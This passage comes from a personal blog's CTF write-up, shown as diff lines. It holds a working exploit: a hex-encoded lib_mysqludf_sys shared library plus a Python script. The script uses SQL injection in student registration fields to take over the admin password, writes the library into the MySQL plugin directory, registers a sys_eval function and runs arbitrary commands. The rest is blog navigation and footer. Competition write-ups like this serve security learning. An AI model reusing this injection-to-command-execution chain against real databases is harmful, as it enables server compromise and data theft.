0FFFFFFFF250A0B20006805000000E990FFFFFFFF25020B20006806000000E980FFFFFFFF25FA0A20006807000000E970FFFFFFFF25F20A20006808000000E960FFFFFFFF25EA0A20006809000000E950FFFFFFFF25E20A2000680A000000E940FFFFFFFF25DA0A2000680B000000E930FFFFFFFF25D20A2000680C000000E920FFFFFFFF25CA0A2000680D000000E910FFFFFFFF25C20A2000680E000000E900FFFFFFFF25BA0A2000680F000000E9F0FEFFFF00000000000000004883EC08488B05F50920004885C07402FFD04883C408C390909090909090909055803D900A2000004889E5415453756248833DD809200000740C488B3D6F0A2000E812FFFFFF488D05130820004C8D2504082000488B15650A20004C29E048C1F803488D58FF4839DA73200F1F440000488D4201488905450A200041FF14C4488B153A0A20004839DA72E5C605260A2000015B415CC9C3660F1F8400000000005548833DBF072000004889E57422488B05530920004885C07416488D3DA70720004989C3C941FFE30F1F840000000000C9C39090C3C3C3C331C0C3C341544883C9FF4989F455534883EC10488B4610488B3831C0F2AE48F7D1488D69FFE8B6FEFFFF83F80089C77C61754FBF1E000000E803FEFFFF488D70FF4531C94531C031FFB921000000BA07000000488D042E48F7D64821C6E8AEFEFFFF4883F8FF4889C37427498B4424104889EA4889DF488B30E852FEFFFFFFD3EB0CBA0100000031F6E802FEFFFF31C0EB05B8010000005A595B5D415CC34157BF00040000415641554531ED415455534889F34883EC1848894C24104C89442408E85AFDFFFFBF010000004989C6E84DFDFFFFC600004889C5488B4310488D356A030000488B38E814FEFFFF4989C7EB374C89F731C04883C9FFF2AE4889EF48F7D1488D59FF4D8D641D004C89E6E8DDFDFFFF4A8D3C284889DA4C89F64D89E54889C5E8A8FDFFFF4C89FABE080000004C89F7E818FDFFFF4885C075B44C89FFE82BFDFFFF807D0000750A488B442408C60001EB1F42C6442DFF0031C04883C9FF4889EFF2AE488B44241048F7D148FFC94889084883C4184889E85B5D415C415D415E415FC34883EC08833E014889D7750B488B460831D2833800740E488D353A020000E817FDFFFFB20188D05EC34883EC08833E014889D7750B488B460831D2833800740E488D3511020000E8EEFCFFFFB20188D05FC3554889FD534889D34883EC08833E027409488D3519020000EB3F488B46088338007409488D3526020000EB2DC7400400000000488B4618488B384883C70248037808E801FCFFFF31D24885C0488945107511488D351F0200004889DFE887FCFFFFB20141585B88D05DC34883EC08833E014889F94889D77510488B46088338007507C6010131C0EB0E488D3576010000E853FCFFFFB0014159C34154488D35EF0100004989CC4889D7534889D34883EC08E832FCFFFF49C704241E0000004889D8415A5B415CC34883EC0831C0833E004889D7740E488D35D5010000E807FCFFFFB001415BC34883EC08488B4610488B38E862FBFFFF5A4898C34883EC28488B46184C8B4F104989F2488B08488B46104C89CF488B004D8D4409014889C6F3A44C89C7498B4218488B0041C6040100498B4210498B5218488B4008488B4A08BA010000004889C6F3A44C89C64C89CF498B4218488B400841C6040000E867FBFFFF4883C4284898C3488B7F104885FF7405E912FBFFFFC3554889CD534C89C34883EC08488B4610488B38E849FBFFFF4885C04889C27505C60301EB1531C04883C9FF4889D7F2AE48F7D148FFC948894D00595B4889D05DC39090909090909090554889E5534883EC08488B05C80320004883F8FF7419488D1DBB0320000F1F004883EB08FFD0488B034883F8FF75F14883C4085BC9C390904883EC08E86FFBFFFF4883C408C345787065637465642065786163746C79206F6E6520737472696E67207479706520706172616D657465720045787065637465642065786163746C792074776F20617267756D656E747300457870656374656420737472696E67207479706520666F72206E616D6520706172616D6574657200436F756C64206E6F7420616C6C6F63617465206D656D6F7279006C69625F6D7973716C7564665F7379732076657273696F6E20302E302E34004E6F20617267756D656E747320616C6C6F77656420287564663A206C69625F6D7973716C7564665F7379735F696E666F290000011B033B980000001200000040FBFFFFB400000041FBFFFFCC00000042FBFFFFE400000043FBFFFFFC00000044FBFFFF1401000047FBFFFF2C01000048FBFFFF44010000E2FBFFFF6C010000CAFCFFFFA4010000F3FCFFFFBC0100001CFDFFFFD401000086FDFFFFF4010000B6FDFFFF0C020000E3FDFFFF2C02000002FEFFFF4402000016FEFFFF5C02000084FEFFFF7402000093FEFFFF8C0200001400000000000000017A5200017810011B0C070890010000140000001C00000084FAFFFF01000000000000000000000014000000340000006DFAFFFF010000000000000000000000140000004C00000056FAFFFF01000000000000000000000014000000640000003FFAFFFF010000000000000000000000140000007C00000028FAFFFF030000000000000000000000140000009400000013FAFFFF01000000000000000000000024000000AC000000FCF9FFFF9A00000000420E108C02480E18410E20440E3083048603000000000034000000D40000006EFAFFFFE800000000420E10470E18420E208D048E038F02450E28410E30410E38830786068C05470E50000000000000140000000C0100001EFBFFFF2900000000440E100000000014000000240100002FFBFFFF2900000000440E10000000001C0000003C01000040FBFFFF6A00000000410E108602440E188303470E200000140000005C0100008AFBFFFF3000000000440E10000000001C00000074010000A2FBFFFF2D00000000420E108C024E0E188303470E2000001400000094010000AFFBFFFF1F00000000440E100000000014000000AC010000B6FBFFFF1400000000440E100000000014000000C4010000B2FBFFFF6E00000000440E300000000014000000DC01000008FCFFFF0F00000000000000000000001C000000F4010000FFFBFFFF4100000000410E108602440E188303470E2000000000000000000000FFFFFFFFFFFFFFFF0000000000000000FFFFFFFFFFFFFFFF000000000000000000000000000000000100000000000000B2010000000000000C00000000000000A00B0000000000000D00000000000000781100000000000004000000000000005801000000000000F5FEFF6F00000000A00200000000000005000000000000006807000000000000060000000000000060030000000000000A00000000000000E0010000000000000B0000000000000018000000000000000300000000000000E81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200A0000000000000700000000000000C0090000000000000800000000000000600000000000000009000000000000001800000000000000FEFFFF6F00000000A009000000000000FFFFFF6F000000000100000000000000F0FFFF6F000000004809000000000000F9FFFF6F0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000CE0B000000000000DE0B000000000000EE0B000000000000FE0B0000000000000E0C0000000000001E0C0000000000002E0C0000000000003E0C0000000000004E0C0000000000005E0C0000000000006E0C0000000000007E0C0000000000008E0C0000000000009E0C000000000000AE0C000000000000BE0C0000000000008017200000000000004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200004743433A202844656269616E20342E332E322D312E312920342E332E3200002E7368737472746162002E676E752E68617368002E64796E73796D002E64796E737472002E676E752E76657273696F6E002E676E752E76657273696F6E5F72002E72656C612E64796E002E72656C612E706C74002E696E6974002E74657874002E66696E69002E726F64617461002E65685F6672616D655F686472002E65685F6672616D65002E63746F7273002E64746F7273002E6A6372002E64796E616D6963002E676F74002E676F742E706C74002E64617461002E627373002E636F6D6D656E7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000F0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000B000000F6FFFF6F0200000000000000A002000000000000A002000000000000C000000000000000030000000000000008000000000000000000000000000000150000000B00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001D00000003000000020000000000000068070000000000006807000000000000E00100000000000000000000000000000100000000000000000000000000000025000000FFFFFF6F020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000FEFFFF6F0200000000000000A009000000000000A009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000C009000000000000C00900000000000060000000000000000300000000000000080000000000000018000000000000004B000000040000000200000000000000200A000000000000200A0000000000008001000000000000030000000A0000000800000000000000180000000000000055000000010000000600000000000000A00B000000000000A00B000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000B80B000000000000B80B00000000000010010000000000000000000000000000040000000000000010000000000000005B000000010000000600000000000000D00C000000000000D00C000000000000A80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000E000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000DD000000000000000000000000000000010000000000000001000000000000006F000000010000000200000000000000641200000000000064120000000000009C000000000000000000000000000000040000000000000000000000000000007D000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008E000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009A000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000A3000000010000000300000000000000D016200000000000D0160000000000001800000000000000000000000000000008000000000000000800000000000000A8000000010000000300000000000000E816200000000000E8160000000000009800000000000000000000000000000008000000000000000800000000000000B1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000B7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000BC000000010000000000000000000000000000000000000088170000000000009B000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000C500000000000000000000000000000001000000000000000000000000000000 into dumpfile &#x27;/usr/lib64/mysql/plugin/exp.so&#x27;;\x23&quot;,</span><br><span class="line">        f&quot;&#123;getRadmonStr()&#125;&#x27;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;exp.so&#x27;;\x23&quot;,</span><br><span class="line">        f&quot;&#123;getRadmonStr()&#125;&#x27;;select sys_eval(\&quot;&#123;CMD&#125;\&quot;);\x23&quot;</span><br><span class="line">    ]</span><br><span class="line">    pocStudentId = []</span><br><span class="line">    for i in poc:</span><br><span class="line">        pocStudentId.append(reg(i))</span><br><span class="line">    print(&quot;[*]Ready to get admin&quot;)</span><br><span class="line">    login(poc[0], pocStudentId[0])</span><br><span class="line">    postAns()</span><br><span class="line">    print(f&quot;[*][?]set admin passwd: &#123;passwd&#125;&quot;)</span><br><span class="line"></span><br><span class="line">    logout()</span><br><span class="line">    if &quot;something err0r&quot; not in (login(&quot;admin&quot;, passwd)):</span><br><span class="line">        print(&quot;[+]login as admin success!&quot;)</span><br><span class="line">    else:</span><br><span class="line">        exit(&quot;[-]login as admin fail!&quot;)</span><br><span class="line"></span><br><span class="line">    print(&quot;[*]write out file&quot;)</span><br><span class="line">    posScore(pocStudentId[1])</span><br><span class="line"></span><br><span class="line">    print(&quot;[*]create function&quot;)</span><br><span class="line">    posScore(pocStudentId[2])</span><br><span class="line"></span><br><span class="line">    print(f&quot;[*]exec cmd: &#123;CMD&#125;&quot;)</span><br><span class="line">    posScore(pocStudentId[3])</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/ctf/" rel="tag"># -ctf</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2022/07/18/%E3%80%90NepCTF2022%E3%80%91write-up/" rel="next" title="【NepCTF2022】write up">
+                <i class="fa fa-chevron-left"></i> 【NepCTF2022】write up
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">82</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">29</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-number"></span> <span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E6%9D%A5%E4%BD%A0%E4%B9%9F%E7%8E%A9%E6%99%BA%E8%83%BD%E5%AE%B6%E5%B1%85%EF%BC%88%E8%B5%9B%E5%90%8E%EF%BC%89"><span class="nav-number">1.</span> <span class="nav-text">原来你也玩智能家居（赛后）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DoubleHappiness"><span class="nav-number">2.</span> <span class="nav-text">DoubleHappiness</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%95%B5%E5%93%94%E5%98%80%E5%98%9F"><span class="nav-number">3.</span> <span class="nav-text">啵哔嘀嘟~</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#REVERSE"><span class="nav-number"></span> <span class="nav-text">REVERSE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BF%AB%E6%9D%A5%E7%AD%BE%E5%88%B0"><span class="nav-number">1.</span> <span class="nav-text">快来签到</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-number"></span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Challenger"><span class="nav-number">1.</span> <span class="nav-text">Challenger</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%9A%E5%AD%A6%E5%A4%9A%E9%97%BB%E7%9A%84%E8%8A%B1%E8%8A%B1"><span class="nav-number">2.</span> <span class="nav-text">博学多闻的花花</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">liszt_lin</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
